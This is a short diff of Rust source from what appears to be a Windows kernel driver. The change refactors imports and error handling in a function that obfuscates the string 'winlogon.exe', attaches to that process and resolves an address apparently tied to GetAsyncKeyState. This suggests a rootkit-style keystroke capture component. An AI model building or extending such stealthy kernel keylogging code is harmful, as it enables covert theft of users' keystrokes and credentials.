@@ -1,15 +1,11 @@
 use {
     obfstr::obfstr, 
     ntapi::ntzwapi::ZwQuerySystemInformation, 
-    super::{get_process_by_name, pool::PoolMemory, process_attach::ProcessAttach}, 
+    wdk_sys::{NT_SUCCESS, POOL_FLAG_NON_PAGED},
     crate::{process::Process, utils::SystemModuleInformation}, 
-    core::{ffi::{c_void, CStr}, ptr::null_mut, slice::from_raw_parts}, 
-    wdk_sys::{
-        NT_SUCCESS, POOL_FLAG_NON_PAGED,
-    }, 
-    winapi::um::winnt::{
-        RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64
-    }
+    core::{ffi::{c_void, CStr}, ptr::null_mut, slice::from_raw_parts},
+    super::{get_process_by_name, pool::PoolMemory, process_attach::ProcessAttach}, 
+    winapi::um::winnt::{RtlZeroMemory, IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY, IMAGE_NT_HEADERS64}
 };
 
 /// Gets the base address of a specified module.
@@ -99,16 +95,8 @@ pub unsafe fn get_function_address(function_name: &str, dll_base: *mut c_void) -
 /// - `Option<*mut c_void>`: An optional pointer to the function's address, or None if the function is not found.
 ///
 pub unsafe fn get_address_asynckey(name: &str, dll_base: *mut c_void) -> Option<*mut c_void> {
-    let pid = match get_process_by_name(obfstr!("winlogon.exe")) {
-        Some(p) => p,
-        None => return None
-    };
-
-    let target = match Process::new(pid) {
-        Some(p) => p,
-        None => return None
-    };
-
+    let pid = get_process_by_name(obfstr!("winlogon.exe"))?;
+    let target = Process::new(pid)?;
     let attach_process = ProcessAttach::new(target.e_process);
 
     let dll_base = dll_base as usize;
